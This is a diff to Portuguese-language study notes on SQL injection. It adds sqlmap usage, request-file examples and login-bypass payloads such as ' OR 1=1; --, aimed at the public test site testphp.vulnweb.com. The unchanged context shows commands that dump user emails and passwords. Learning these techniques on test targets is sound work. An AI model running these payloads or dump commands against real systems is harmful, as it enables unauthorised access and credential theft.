@@ -175,11 +175,12 @@ Exemplo de uso de um banco de dados msql:
 -> ferramentas para explorar vulnerabilidade sqlinjection 
 	1) sqlmap 
 	- Como usar? 
+	ex url: http://testphp.vulnweb.com/login.php 
 	
 	sqlmap -r header.txt --dbs --dbms=mysql (tipo de banco, mysql, por exemplo, caso tenha essa informação extraída pelos ensinamentos supracitados) 
 	-r passe um arquivo.txt e nele coloque informações relativas a:
-	cat header.txt
-	Get /xxx HTTP/1.1
+	
+	GET /login.php HTTP/1.1
 	Host: url do site
 	User-Agent: xxxxx
 	Cookies: xxxxx
@@ -202,4 +203,28 @@ Exemplo de uso de um banco de dados msql:
 		--------------------------------------
 		3 passwords: 
 	sqlmap -r header.txt --dbms=mysql -D (nome do banco de dados) -T users -C emails, passwords --dump 
+	
+
+	---------------------------------------	 	SQLinjection em formulários        ----------------------------------------------
+	
+	site teste: http://testphp.vulnweb.com/login.php
+	
+	formulário: 						injetando códigos ( aspas simples or duas aspas simples igual a aspas simples ) 
+		usuário: xxx   ------------------ > 		'or''='         ' OR 1=1; --      
+		login: xxx     ------------------ > 		'or''=' 
+										
+	
+	
+	
+	BYPASS 
+	
+	POST /login.php /HTTP1.1	
+	Host: url do site
+	User-Agent: xxxxx
+	Cookies: xxxxx
+	Content-Type: text/html; charset=UTF-8
+	
+	
+	
+	
 	
